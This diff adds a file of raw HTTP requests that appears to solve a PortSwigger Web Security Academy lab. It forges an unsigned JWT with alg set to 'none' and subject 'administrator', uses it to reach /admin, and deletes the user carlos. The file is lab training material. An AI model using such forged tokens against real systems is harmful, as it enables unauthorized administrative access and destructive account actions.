@@ -1,0 +1,21 @@
+POST /login HTTP/1.1
+Host: acc61fb81fc67819c0135037004400d2.web-security-academy.net
+Cookie: session=
+
+csrf=Dw7oCHKGqz0b72uf872sbNdVaNrzC6v6&username=wiener&password=peter
+
+GET /my-account HTTP/1.1
+Host: acc61fb81fc67819c0135037004400d2.web-security-academy.net
+Cookie: session=eyJraWQiOiJkMmEyMGU5Yy0zYjE4LTQyNzQtYjIzYy1mOWU2YTYxNDM2ZjkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUyMTYwMDN9.
+
+GET /admin HTTP/1.1
+Host: acc61fb81fc67819c0135037004400d2.web-security-academy.net
+Cookie: session=eyJraWQiOiJkMmEyMGU5Yy0zYjE4LTQyNzQtYjIzYy1mOWU2YTYxNDM2ZjkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUyMTYwMDN9.
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: acc61fb81fc67819c0135037004400d2.web-security-academy.net
+Cookie: session=eyJraWQiOiJkMmEyMGU5Yy0zYjE4LTQyNzQtYjIzYy1mOWU2YTYxNDM2ZjkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUyMTYwMDN9.
+
+GET /admin HTTP/1.1
+Host: acc61fb81fc67819c0135037004400d2.web-security-academy.net
+Cookie: session=eyJraWQiOiJkMmEyMGU5Yy0zYjE4LTQyNzQtYjIzYy1mOWU2YTYxNDM2ZjkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUyMTYwMDN9.
